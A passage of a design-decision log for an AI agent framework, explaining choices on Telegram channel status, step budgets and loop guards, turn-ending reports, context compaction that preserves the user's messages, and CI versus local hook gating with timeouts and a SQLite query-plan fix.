| 8.17 | **A channel reports "connected" from `getMe`, not from its first poll, and says so exactly once** | Two findings from running it. A long-poll *holds* for 30 seconds, so reporting from the first `getUpdates` return left a correctly configured bot silent for half a minute — indistinguishable from a broken one. `getMe` is one fast call, it names the bot so you know which to message, and it lives inside the detached loop so a Telegram outage still cannot delay boot. Separately, the first version keyed "announce once" on `offset === 0`, which stays true until the first message *ever* arrives — so an idle bot announced itself every 30 seconds forever, and a status line that repeats on a timer is one a reader learns to skip, including when it changes. |
| 8.18 | **A disabled channel is never constructed** | `enabled: false` is the one thing that has to work on a *broken* channel. A factory that ran anyway — and refused because its `tokenEnv` is unset — would make switching one off impossible. The `type` is still checked, because a typo there is a typo either way. Found while making `validate` construct channels so it stops approving manifests `serve` refuses. |
| 8.19 | **409 Conflict names the second instance, not "a 5xx is usually brief"** | Telegram allows exactly one `getUpdates` consumer per token, so a Conflict means another process is polling — another terminal, a container that did not exit, a webhook never deleted. Falling through to the generic 4xx branch told the reader to go and look at the network. Retryable, because it recovers on its own once the other side stops. |

## 12. A turn that stops says so, and compaction keeps the task

| # | Decision | Rationale |
| --- | --- | --- |
| 12.1 | **A step budget is generous; the guard against a loop is repetition** (Moeen, 2026-08-23) | `init` wrote `maxSteps: 6`, justified in its own comment as "a two-tool chain needs five steps… one spare" — the budget for answering a question, not for doing work. Live: `create a sample pdf` spent six productive steps (glob, read the skill, try a heredoc, recover by writing a script, run it, `pip install reportlab`) and died one step before succeeding, the reply ending on *"Let me install it"*. Four numbers disagreed — schema 12, `init` 6, reference 8, minimal 4 — which is itself the sign that none was reasoned. The default is 40 and `limits.noProgress.identicalCalls` (3) is the real guard: a small cap and a repetition check both stop a loop, and only one of them also stops recovery. Compared on slug **and** arguments, before the calls run, because a loop already executed twice has had its side effects twice. |
| 12.2 | **How the loop exited is recorded, never inferred from what the model wrote** | `steps >= maxSteps` is true both for a turn the budget stopped and for an answer that arrived exactly on the last permitted step, so it cannot decide between them. The previous code inferred from `pendingWork \|\| text === ""` and reached the right verdict on every case that mattered — the milo turn included, which the store recorded correctly as `max_steps`. It is replaced because it asked about the model's sentence to learn about the loop, needed a flag reset at the top of every step to stay true, and had no answer where narration and a finished answer look identical. `answered` is set at the one break that means the work is done. **The "misfiled as `final`" defect reported during planning was not real**; the reporting gap underneath it was. |
| 12.3 | **Every ending has a sentence, from one formatter, on every surface** | `stats.reason` reached the transcript reducer and was rendered nowhere, so in the TUI a turn stopped by its budget was pixel-identical to a completed one — which is why milo's stop had no explanation. The plain path had a line for `max_steps` and printed it only when the reply was **empty**, so an agent that stopped mid-task having produced prose said nothing. `channels.ts` returns on empty text, so a cut turn with no prose delivered **nothing at all** to Telegram. `endNote` lives in core (three callers: plain, transcript, channel) and names the remedy rather than the mechanism. `endedBadly` is `reason !== "final" && reason !== "stopped"`, so a new reason cannot exit 0 by omission. |
| 12.4 | **`turnTimeout` and `turnStopped` are called** | Both were written in Phase 1 with hints already in them and never invoked — grep found only the definitions. A timed-out turn carried `status: "timeout"` with three empty error columns, printed one parenthesis, and **exited 0**: a failure reported as success, which is hard rule 8. Verified live: `turn_timeout` now reaches the store with its code, message and hint, and the plain path exits 1. |
| 12.5 | **`truncated` is its own reason** | A `length` finish with text on the floor fell through to `final`. The previous reasoning — truncation is visible, so it needs no flag — holds for a person watching a terminal and nowhere else: on a channel a cut-off reply reads as a short complete one, and to anything reading a result programmatically `final` plus exit 0 means success. The text is still delivered; only the verdict changed. The empty case was already handled, which is what made this the harder half to notice — the output looks like an answer. |
| 12.6 | **No stage drops what the person said** (Moeen, 2026-08-23) | Arithmetic, not preference. Measured on a real 47-message session: tool observations **83.9%** of history bytes, assistant prose 12.6%, tool calls 3.2%, and everything the person had ever typed **0.3%** — 423 bytes of 150 KB. Deleting every one of them frees nothing and costs the only record of what the work is, in a session full of `"continue"`, `"yes"`, `"where are we at?"` — messages worth nothing without their antecedent, which oldest-first kept while dropping the instruction. `isTurnStart` is the whole predicate, so it needs no definition of "the task" and no model call. `reset` is included: its contract is now pinned blocks **and** the person's words. |
| 12.7 | **The ladder is ordered by information destroyed, not bytes freed** (Moeen, 2026-08-23) | `snip .60 → micro .70 → collapse .80 → reset .88 → trim .95`. Bytes freed puts `trim` early; information destroyed puts it last, because `snip` and `micro` leave an `artifact_read` pointer, `collapse` and `reset` leave meaning as a digest, and `trim` leaves nothing. Its gentle name is exactly why it was misplaced. The forced half is not the ordering principle: with `trim` third, `collapse` and `reset` **could never fire**. They only get a turn when `trim` failed to reach target, which means `trim` had already dropped everything it was allowed to, leaving the request spine — and a digest *plus* the preserved spine can never be smaller than the spine alone. Measured: 8316 → 7860 → 5064, then both `changed=false` at 495 tokens. Summarising has to precede destroying or the summary has no subject. `trim` last is the fallback for a short history of terse turns where the no-growth guard refused a digest. |
| 12.8 | **`trim` re-keys the displacement map, and protects a digest** | Two traps the reorder set, both silent. `runLadder` *replaces* the map with whatever a stage returns; `trim` reindexes and returned an empty one, with a comment saying it ran first so there could never be a map to lose. Running third, that discards everything `snip` and `micro` recorded — `persist()` is never asked to write those artifacts while the pointers naming them stay in the surviving messages, leaving a live `artifact_read` id resolving to nothing. And an unprotected digest is the first thing `trim` eats, since a digest is not a turn start. Both guarded by tests that go red with the fix reverted. |
| 12.9 | **A manifest in the old threshold order is refused by name** | `examples/reference` set the five values explicitly, which read in the new order as `snip .70 · micro .80 · trim .60` — not ascending. Bare `manifest_thresholds_not_ascending` would point at `trim` and say it must exceed `micro`: true, and about a line nobody typed. `manifest_thresholds_legacy_order` names the swap and prints the rewrite, generated by zipping the two orders so a hint cannot name the wrong stage. `THRESHOLD_ORDER` now *is* `STAGE_ORDER` — it was a second hand-kept copy, and the copy silently described a ladder that no longer existed the moment the stages moved. |
| 12.10 | **The compactor gets its own window, its own signal, and a bounded span** | Thirteen lines with three defects. `requestParamsFor(compactor, this.window)` passed **main's** window; nothing bounded the span against the compactor's at all; and `signal: new AbortController().signal` was never aborted, so a hanging compactor blocked the step outside both the turn signal and `turnTimeoutMs`. `roles.ts` calls a cheap compactor beside a large main *"the intended production shape and usually the biggest available cost win"* — exactly the configuration where the span overflows. It threw, `digestFor` caught it, the ladder fell back to `mechanicalDigest`, and `digestSource: "mechanical"` was reported to nobody: **the recommended cost optimisation silently never worked.** A configured compactor that falls back now warns. Guarded by reading the digest request's own body. |
| 12.11 | **Two things may pass the prompt budget; nothing may pass the window in silence** | The current turn's own trace and the person's requests are both kept past `promptBudget` — the alternative is a model reasoning about a tool result absent from its own prompt. `reserveOutput` is a reserve being spent, so that is a trade rather than a bug. The window is not: measured live at a declared 6,000, a 12-step turn assembled **6,743** tokens and was simply sent, which an endpoint whose real window matched would have refused. The rescue is capped at the window and `prompt_over_window` warns with three remedies. `assembleContext`'s blunt trim shares `isTurnStart` with the ladder, because two definitions of "what the person said" is how one path honoured 12.6 while the other, on the same session a moment later, did not — found live, not by reading. |
| 12.12 | **`droppedMessages` has a reader, and every warning reaches the plain path** | `AssembledContext.droppedMessages` was documented "Reported, never silent" and had no reader anywhere for six phases, so the budget could remove the oldest half of a conversation with slightly less history as the only symptom; it is now `context.dropped`, on both output paths and pinned by the both-paths boundary test. Separately, the plain path filtered `agent.warning` to the single code `manifest_changed`, so a truncated reply, a repeated call, a silent compactor fallback and an over-window prompt were all invisible there. `showRows` exists to keep a one-shot run free of *progress* rows, and a warning is not progress. |

## 13. CI is the authority, and the hooks are feedback

| # | Decision | Rationale |
| --- | --- | --- |
| 13.1 | **CI is the authority; the local hooks are fast feedback** (Moeen, 2026-08-23) | The proposal was the other way round — trim CI because husky already runs the tests — and the numbers pointed the other way. CI's whole gate is ~50 s of work, of which `bun test` is 28 s; the four hours came from one unbounded hang in a step husky does not run. Meanwhile `pre-commit` was `typecheck` + `test` + `build` + `lint-staged` — about 40 s **per commit**, which is what teaches a person to type `--no-verify`, after which nothing ran anywhere. So `pre-commit` is `lint-staged` alone (1.2 s), a new `pre-push` carries `build` → `typecheck` → `test` (39 s, once per push), and CI keeps everything. Three things husky structurally cannot check, all of which bit this week: it runs against a tree that already has a `dist/`, it never runs `test:node`, and it is macOS. Same shape as *"a check that only `run` performs is a check `validate` disagrees with"* — two callers of one gate, and the authoritative one has to be the one that cannot be skipped and is not somebody's laptop. |
| 13.2 | **`build` precedes `typecheck` and `test`, in CI and in the hook** | The workflow was ordered cheapest-first, *"so a lint error does not wait on a build"* — right about lint and wrong about everything after it. Every sibling import resolves through that package's `dist/`, so on a checkout that has none `typecheck` reports **79** `TS2307: Cannot find module '@dispach/core'` and `bun test` **34** module-resolution errors. The merge gate had been red for **nine days** on a tree where both commands pass locally, because an earlier build had left the directory there. The inverse of the recorded stale-`dist` hazard and it hides better: a stale `dist` fails a test, an absent one fails a command unrelated to the change. Corollary: **verify a workflow change against a fresh clone**, never against a working tree. |
| 13.3 | **Every job and the one step known to hang carry `timeout-minutes`** | There were none, so a hang was bounded by GitHub's six-hour ceiling — 6 h × 2 matrix legs on every push for five days, reported as `cancelled`, which reads as somebody's own doing rather than a fault. Structural for the same reason `KeepAlive: {Crashed: true}` is: a fault that stops once gets looked at, and one that retries forever gets a log nobody opens. `test:node` also carries `--test-timeout`, which is **not** sufficient on its own and was assumed to be: the hang was `mkdirSync(recursive)` spinning inside libuv, which blocks the event loop, so no timer fires and no reporter runs. Node printed `TAP version 13` and stopped dispatching — thirteen of forty-four files silently never ran. Only a wall clock outside the process sees that. |
| 13.4 | **`mkdirSync(recursive: true)` under `/proc` never returns, so a test proves unwritability with `ENOTDIR`** | `skills-index.test.ts` picked `/proc/nonexistent-and-unwritable` as a path that cannot be written. On Linux procfs answers `mkdir` with `ENOENT` although the parent exists, so Node's recursive mkdirp walks up, finds `/proc`, retries the child, and loops — forever, 100% of one core, event loop blocked. On macOS the same path resolves to nothing and fails in a millisecond, which is why it looked correct everywhere it was run. Non-recursive returns `ENOENT` instantly. The replacement is a regular **file** standing where the cache directory would go: `ENOTDIR`, immediate, platform-independent. `chmod 0o500` was the other candidate and is worse — it passes **vacuously as root**, which is a container and most CI images. |
| 13.5 | **The Node floor is 24, and the version that found the planner bug is the one being dropped** (Moeen, 2026-08-23) | `engines.node` was `>=22` and the matrix ran 22 and 24. Node 22 bundles SQLite 3.51.3, whose planner reads `WHERE memory_fts MATCH ? AND p.agent_id = ?` as an invitation to enter through `memory_passages_source (agent_id, source)` and probe the virtual table once per row — **260 ms against 0.7 ms** over 5,000 passages. A runtime whose stdlib is a version behind on the one library this project keeps its memory in is not worth carrying by default. The uncomfortable half is stated rather than hidden: 22 is the leg that *found* this, and dropping it removes the only configuration in CI where the guard below can go red. That is why the guard is not only a query plan. The matrix keeps its one entry so adding 26 is a line rather than a restructure. |
| 13.6 | **The memory queries pin their plan with a unary `+`, and the guard asserts the syntax as well** | Measured over 5,000 passages, `:memory:`, same code: 3.51.0 (bun) **0.7 ms**, 3.51.3 (node 22) **260 ms**, 3.53.3 (node 24) **0.7 ms**. The slow version sits *between* the two fast ones, so this is not a release to wait out, and the cost is linear in corpus size — it gets worse exactly as an agent remembers more, which is the one direction a retrieval path must not scale in. `+p.agent_id` suppresses index use on that term only and pins `SCAN f VIRTUAL TABLE INDEX 0:M1` on all three; results are identical, since SQLite applies the whole `WHERE` before `LIMIT`. The SQL is exported so `store.test.ts` runs `EXPLAIN QUERY PLAN` over the exact strings rather than a copy — but the plan assertion **cannot fail on either runtime CI now runs**, so the `+` is asserted in the SQL text too. A guard that can only go red on a version nobody runs is the "passes with the fix reverted" shape this repo has now been caught by three times. |
| 13.7 | **A wall-clock assertion belongs in an eval, not in the unit suite** (Moeen, 2026-08-23) | `index cold in under 50 ms and cached in under 5 ms` failed **2 runs in 3** with four builds beside it, which is a shared 2-core runner every time. Widening it in place would have relaxed a published criterion quietly, which the test's own comment refused. The measurements say why widening is also the wrong repair: cold is 5.09 ms median **idle** with a 185.76 ms worst sample, and 4.23 ms median under load with a 34.03 ms worst — the median barely moves and a single sample is worth nothing. Any threshold generous enough to survive that spike is no longer testing the criterion. So `bun run eval:skills` takes a median over repeats, states the criterion, and enforces a ceiling ten times above it; `evals/skills/README.md` carries the numbers. The unit test keeps what is not about time: fifty skills load, the second scan reports `cached`, and the token counts match — a cache that returns a different catalogue is the failure worth having a test for. |
